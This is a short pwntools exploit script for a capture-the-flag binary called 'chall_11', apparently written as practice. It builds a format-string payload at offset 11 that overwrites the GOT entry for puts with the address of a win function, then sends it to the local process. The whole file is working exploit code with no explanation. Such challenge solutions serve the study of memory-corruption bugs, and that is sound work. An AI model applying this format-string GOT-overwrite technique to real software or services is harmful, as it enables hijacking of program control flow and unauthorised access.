from pwn import *
p = process('./chall_11')
binary = context.binary = ELF('./chall_11')

p.sendline()

offset = 11
payload = fmtstr_payload(offset,{binary.sym.puts:binary.sym.win})
p.sendline(payload)

#null = payload.find(b'\x00')
#p.recvuntil(payload[null-3:null])

#p.interactive()
